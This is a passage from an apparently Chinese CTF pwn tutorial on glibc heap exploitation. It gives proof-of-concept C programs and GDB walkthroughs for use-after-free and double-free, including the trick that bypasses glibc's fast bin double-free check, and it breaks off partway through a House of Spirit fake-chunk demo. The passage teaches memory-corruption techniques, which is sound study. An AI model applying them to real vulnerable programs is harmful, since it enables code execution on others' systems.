src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A831.png" alt="CTF - PWN_堆相关的漏洞与利用31.png"></p><p>执行 <code>free(a)</code> 后，<code>chunk a</code> 被置于 <code>fast bin</code> 中</p><p><strong><code>myname</code> 指针被置为 NULL，但 <code>func</code> 指针未发生变化</strong>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A832.png" alt="CTF - PWN_堆相关的漏洞与利用32.png"></p><p>此时通过 <code>a -&gt; func(&quot;I can also use it&quot;)</code> 依然可以调用 <code>myprint()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A833.png" alt="CTF - PWN_堆相关的漏洞与利用33.png"></p><p>当我们将 <code>func</code> 指针修改为 <code>printmyname()</code> 后，通过 <code>a -&gt; func(&quot;this is my function&quot;)</code> 也可以调用 <code>printmyname()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A834.png" alt="CTF - PWN_堆相关的漏洞与利用34.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A835.png" alt="CTF - PWN_堆相关的漏洞与利用35.png"></p><p>当我们通过 <code>a = NULL</code> 将其置为 NULL 后，<strong>堆的布局并未发生变化</strong>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A836.png" alt="CTF - PWN_堆相关的漏洞与利用36.png"></p><p>但当我们再次使用 <code>a -&gt; func(&quot;can not be printed...&quot;)</code> 的时候</p><p>**程序会直接报出段错误，而不是继续调用 <code>0x4005d1</code> 地址处的 <code>printmyname()</code>**：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A837.png" alt="CTF - PWN_堆相关的漏洞与利用37.png"></p><blockquote><p>发生段错误的关键在于：</p><p>我们前面执行 <code>a = NULL</code> 的时候将 RBP - 8 地址处置为了 0，因此执行 <code>mov rax, qword ptr [rbp - 8]</code> 时 RAX &#x3D; 0，此时执行 <code>mov rax, qword ptr [rax + 8]</code> 要求从内存地址为 8 的地方取值赋给 RAX，显然这个内存地址是错误的</p></blockquote><hr><h1 id="Fast-bin-Attack"><a href="#Fast-bin-Attack" class="headerlink" title="Fast bin Attack"></a>Fast bin Attack</h1><blockquote><p>Fast bin Attack 是一类漏洞的利用方法，是指所有基于 <code>fast bin</code> 机制的漏洞利用方法</p><p>参考文章：<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/">Fastbin Attack - CTF Wiki</a></p></blockquote><p>Fast bin Attack 利用的前提：</p><ul><li>存在堆溢出、UAF 等能控制 <code>chunk</code> 内容的漏洞  </li><li>漏洞发生于 <code>fast bin</code> 类型的 <code>chunk</code> 中</li></ul><p>由于 <code>fast bin</code> 使用单链表来维护释放的堆块，并且<strong>由 <code>fast bin</code> 管理的 <code>chunk</code> 即使被释放，其 <code>next_chunk</code> 的 <code>prev_inuse</code> 位也不会被清空</strong></p><p>示例：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">,</span> <span class="token operator">*</span>chunk2<span class="token punctuation">,</span> <span class="token operator">*</span>chunk3<span class="token punctuation">;</span>    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chunk2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chunk3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 进行释放</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行三次 <code>free</code> 进行释放后</p><p>此时位于 <code>main_arena</code> 中的 <code>fastbin</code> 链表中已经储存了指向 <code>chunk3</code> 的指针（最近释放），并且 <code>chunk3</code>、<code>chunk2</code>、<code>chunk1</code> 构成了一个单链表：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A851.png" alt="CTF - PWN_堆相关的漏洞与利用51.png"></p><hr><h2 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h2><blockquote><p>Double free 指同一个指针指向的内存被 <code>free</code> 两次</p><p>堆上的某块内存被释放后，如果没有将指向该堆块的指针清零，就可以利用程序的其他部分对该内存进行再次的 <code>free</code>，<strong>最终得到一个可用的空闲块指针，并且能够修改已经被释放的空闲块中的内容</strong>，从而利用这个漏洞实现<strong>任意地址写</strong></p><p>参考文章：<a href="https://www.anquanke.com/post/id/241598">堆利用系列之堆漏洞-安全客 - 安全资讯平台</a></p></blockquote><p>总的来说，double free 就是通过 2 次 <code>free</code>，2 次 <code>malloc</code>，再 1 次 <code>free</code>，最终得到可用的空闲块指针，并且可以修改空闲块中的内容</p><p>详细来说就是：</p><ol><li>首先两次 <code>free</code> 同一块地址（两次 <code>free</code> 之间需要先 <code>free</code> 一次其他的 <code>chunk</code> 来绕过检测）  </li><li>然后再连续两次 <code>malloc</code> 相同大小  </li><li>然后再 <code>free</code> 掉其中一个</li><li>那么剩下那个指针指向的就是空闲块的 <code>chunk</code>，而且还是可以被修改的</li></ol><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>ptr0<span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">,</span> <span class="token operator">*</span>ptr2<span class="token punctuation">;</span>    ptr0 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk1</span>    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk2</span>    ptr2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk3</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data0 <span class="token operator">=</span> <span class="token string">"00000000"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data1 <span class="token operator">=</span> <span class="token string">"11111111"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data2 <span class="token operator">=</span> <span class="token string">"22222222"</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr0<span class="token punctuation">,</span> data0<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr1<span class="token punctuation">,</span> data1<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr2<span class="token punctuation">,</span> data2<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk1: ptr0 @ %p\t contains: %s\n"</span><span class="token punctuation">,</span> ptr0<span class="token punctuation">,</span> ptr0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk2: ptr1 @ %p\t contains: %s\n"</span><span class="token punctuation">,</span> ptr1<span class="token punctuation">,</span> ptr1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk3: ptr2 @ %p\t contains: %s\n\n"</span><span class="token punctuation">,</span> ptr2<span class="token punctuation">,</span> ptr2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr0<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// double free</span>    <span class="token keyword">char</span> <span class="token operator">*</span>ptr3<span class="token punctuation">,</span> <span class="token operator">*</span>ptr4<span class="token punctuation">,</span> <span class="token operator">*</span>ptr5<span class="token punctuation">;</span>    ptr3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk4</span>    ptr4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk5</span>    ptr5 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk6</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr3<span class="token punctuation">,</span> data0<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr4<span class="token punctuation">,</span> data1<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr5<span class="token punctuation">,</span> data2<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk4: ptr3 @ %p\t contains: %s\n"</span><span class="token punctuation">,</span> ptr3<span class="token punctuation">,</span> ptr3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk5: ptr4 @ %p\t contains: %s\n"</span><span class="token punctuation">,</span> ptr4<span class="token punctuation">,</span> ptr4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk6: ptr5 @ %p\t contains: %s\n\n"</span><span class="token punctuation">,</span> ptr5<span class="token punctuation">,</span> ptr5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr3<span class="token punctuation">)</span><span class="token punctuation">;</span>    ptr3 <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk4: ptr3 @ %p\n"</span><span class="token punctuation">,</span> ptr3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk6: ptr5 @ %p\n\n"</span><span class="token punctuation">,</span> ptr5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data3 <span class="token operator">=</span> <span class="token string">"15935728"</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr5<span class="token punctuation">,</span> data3<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk5: @ %p\t contains: %s\n\n"</span><span class="token punctuation">,</span> ptr5<span class="token punctuation">,</span> ptr5<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们通过 GDB 调试观察一下整个执行流程</p><p>刚开始创建三个堆块 <code>ptr0</code>、<code>ptr1</code> 和 <code>ptr2</code>，并通过 <code>data0</code>、<code>data1</code>、<code>data2</code> 进行赋值：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A838.png" alt="CTF - PWN_堆相关的漏洞与利用38.png"></p><p>此时输出信息：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Chunk1<span class="token operator">:</span> ptr0 @ <span class="token number">0x602010</span> contains<span class="token operator">:</span> <span class="token number">00000000</span>Chunk2<span class="token operator">:</span> ptr1 @ <span class="token number">0x602050</span> contains<span class="token operator">:</span> <span class="token number">11111111</span>Chunk3<span class="token operator">:</span> ptr2 @ <span class="token number">0x602090</span> contains<span class="token operator">:</span> <span class="token number">22222222</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>首先 <code>free</code> 掉 <code>ptr0</code> 和 <code>ptr1</code>，它们都被置于 <code>fast bin</code> 中：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A839.png" alt="CTF - PWN_堆相关的漏洞与利用39.png"></p><p><code>ptr1</code> 的 <code>fd</code> 指针指向下一个空闲的 <code>chunk</code>，即：<code>ptr0</code> 的地址</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A842.png" alt="CTF - PWN_堆相关的漏洞与利用42.png"></p><blockquote><p>注意：</p><p>在对 <code>ptr0</code> 的 double free 之间，我们穿插了一个 <code>free(ptr1)</code> 的操作，这么做不是毫无根据的，而是为了绕过检测</p><p>因为在不同版本的 <code>malloc</code> 中，可能存在对 double free 的检测：<strong>如果当前被释放的指针与最后一个释放的内存块相同，程序将停止执行</strong></p><p>而 <code>fast bin</code> 在执行 <code>free</code> 的时候仅验证了 <code>main_arena</code> 直接指向的块，即链表指针头部的块，对于链表后面的块，并没有进行验证</p><p>因此，绕过这个检测的方法就是：<strong>在两次释放同一个指针之间释放另一个指针</strong>（但是在 Glibc 2.27 中，它将命中 <code>tcache</code>，就不存在这个问题）</p></blockquote><p>为了实现 double free，我们再次 <code>free</code> 掉 <code>ptr0</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A840.png" alt="CTF - PWN_堆相关的漏洞与利用40.png"></p><p>此时 <code>ptr1</code> 的 <code>fd</code> 指针指向 <code>ptr0</code> 的地址，同时 <code>ptr0</code> 的 <code>fd</code> 指针也指向 <code>ptr1</code> 的地址</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A841.png" alt="CTF - PWN_堆相关的漏洞与利用41.png"></p><p>接下来，我们将分配三个新内存块，大小与我们释放的内存块相同</p><p>执行完 <code>ptr3 = malloc(0x30)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A843.png" alt="CTF - PWN_堆相关的漏洞与利用43.png"></p><p>执行完 <code>ptr4 = malloc(0x30)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A844.png" alt="CTF - PWN_堆相关的漏洞与利用44.png"></p><p>执行完 <code>ptr5 = malloc(0x30)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A845.png" alt="CTF - PWN_堆相关的漏洞与利用45.png"></p><p>向它们写入 <code>data0</code>、<code>data1</code>、<code>data2</code> 的数据，这将使我们得到之前释放的三个内存块</p><p>执行完 <code>memcpy(ptr3, data0, 0x8)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A846.png" alt="CTF - PWN_堆相关的漏洞与利用46.png"></p><p>执行完 <code>memcpy(ptr4, data1, 0x8)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A847.png" alt="CTF - PWN_堆相关的漏洞与利用47.png"></p><p>执行完 <code>memcpy(ptr5, data2, 0x8)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A848.png" alt="CTF - PWN_堆相关的漏洞与利用48.png"></p><p>可以看到，向 <code>ptr5</code> 中写入的数据实际写入到了 <code>chunk4</code> 中</p><p>此时输出信息：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Chunk4<span class="token operator">:</span> ptr3 @ <span class="token number">0x602010</span> contains<span class="token operator">:</span> <span class="token number">22222222</span>Chunk5<span class="token operator">:</span> ptr4 @ <span class="token number">0x602050</span> contains<span class="token operator">:</span> <span class="token number">11111111</span>Chunk6<span class="token operator">:</span> ptr5 @ <span class="token number">0x602010</span> contains<span class="token operator">:</span> <span class="token number">22222222</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>到这里可以发现，<strong>由于前面两次释放了同一个指针，现在我们分配到了相同的指针</strong>（因为 <code>malloc</code> 会出于性能提升的原因重用相似大小的已释放内存块）</p></blockquote><p><em>现在我们可以释放指向 <code>chunk4</code> 或 <code>chunk6</code> 的其中一个指针（即：<code>ptr3</code> 或 <code>ptr5</code>），并清除该指针（防止使用释放后的指针），而我们仍然会有一个指针指向同一个内存块，而该内存块现在已被释放</em></p><p><mark>也就是说，我们可以利用 double free 来编辑已释放的内存块</mark></p><p>执行 <code>free(ptr3)</code> 并将 <code>ptr3</code> 置为 NULL 后：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A849.png" alt="CTF - PWN_堆相关的漏洞与利用49.png"></p><p>此时输出信息：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Chunk4<span class="token operator">:</span> ptr3 @ <span class="token punctuation">(</span>nil<span class="token punctuation">)</span>Chunk6<span class="token operator">:</span> ptr5 @ <span class="token number">0x602010</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过 <code>memcpy(ptr5, data3, 0x8)</code> 向 <code>ptr5</code> 写入数据时，<strong>会将数据写入到已经被释放的 <code>chunk4</code> 中</strong></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A850.png" alt="CTF - PWN_堆相关的漏洞与利用50.png"></p><p>此时输出信息：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Chunk6<span class="token operator">:</span> ptr5 @ <span class="token number">0x602010</span> contains<span class="token operator">:</span> <span class="token number">15935728</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><blockquote><p>House of Spirit 是 the Malloc Maleficarum 中的一种技术，其核心在于：<strong>在目标位置处伪造 <code>fast bin chunk</code>，并将其释放，从而实现分配指定地址的 <code>chunk</code></strong></p></blockquote><p>要想构造 <code>fast bin fake chunk</code> 并且将其释放时，可以将其放入到对应的 <code>fast bin</code> 链表中，但需要绕过一些必要的检测：</p><ul><li><code>fake chunk</code> 的 <code>ISMMAP</code> 位不能为 1，因为 <code>free</code> 时，如果是 <code>mmap</code> 的 <code>chunk</code>，会单独处理</li><li><code>fake chunk</code> 地址需要对齐，<code>MALLOC_ALIGN_MASK</code></li><li><code>fake chunk</code> 的 <code>size</code> 大小需要满足对应的 <code>fast bin</code> 的需求，同时也得对齐</li><li><code>fake chunk</code> 的 <code>next chunk</code> 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code></li><li><code>fake chunk</code> 对应的 <code>fast bin</code> 链表头部不能是该 <code>fake chunk</code>，即不能构成 <code>double free</code> 的情况</li></ul><p>示例：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This file demonstrates the house of spirit attack.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Calling malloc() once so that it sets up its memory.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We will now overwrite a pointer to point to a fake 'fastbin' region.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>a<span class="token punctuation">;</span>    <span class="token comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> fake_chunks<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span> <span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_chunks<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span> <span class="token comment">// this is the size</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) &amp;&amp; &lt; av->system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span>    fake_chunks<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1234</span><span class="token punctuation">;</span> <span class="token comment">// nextsize</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    a <span class="token operator">=</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span 